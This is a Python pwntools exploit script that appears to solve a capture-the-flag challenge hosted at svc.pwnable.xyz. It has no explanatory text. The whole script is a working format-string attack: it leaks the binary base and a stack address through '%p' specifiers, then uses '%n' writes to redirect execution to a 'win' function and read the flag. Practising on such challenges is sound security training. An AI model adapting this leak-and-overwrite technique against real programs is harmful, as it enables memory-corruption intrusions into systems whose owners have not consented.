from pwn import *
from libformatstr import FormatStr

# 0x56555648 = puts
# 0x56555618 = printf
# 0x56555680 = scanf

def choose(choice):
	p.sendlineafter('>', str(choice))

def editName(name):
	choose(binary_base+0x2001)
	p.sendlineafter('Name:', name)

def prepName():
	choose(binary_base+0x2002)

def printName():
	choose(binary_base+0x2003)	

win_offset = 0x9fd
binary_base = -0x2000		

# p = process('./challenge')
# gdb.attach(p, '''b *0x565558fc''')
p = remote('svc.pwnable.xyz', 30010)
p.sendlineafter('Name:', 'Joel')
padding = 'AAAABBBBCCCCDDDDEEEEFFFFG'

editName(padding + '%2$p')
prepName()
p.recv()
leak = int(p.recvuntil('\n')[:-1], 16)
binary_base = leak - 0x2070
win_addr = binary_base + win_offset

editName(padding + '%10$p')
prepName()
p.recv()
stack_leak = int(p.recvuntil('\n')[:-1], 16)

print hex(binary_base), hex(stack_leak)

editName(padding + 'AB%6$n')
prepName()
stack_leak = stack_leak - 0xc

for i in range(10):
	choose(binary_base + 0x208f + i)
	prepName()

last_four = win_addr & 0xffff
first_four = win_addr>>16

exploit = ''
exploit += '%{}u'.format(str(last_four-0x30+36))
exploit += '%6$n'
exploit += 'A'*(31-len(exploit))

editName(exploit)
choose(stack_leak - 0xffffffff - 0x1)
prepName()

exploit = ''
exploit += '%{}u'.format(str(first_four-0x30+32))
exploit += '%6$n'
exploit += 'A'*(31-len(exploit))

editName(exploit)
choose((stack_leak+0x2) - 0xffffffff - 0x1)
prepName()

choose(0)
print p.recvuntil('}')


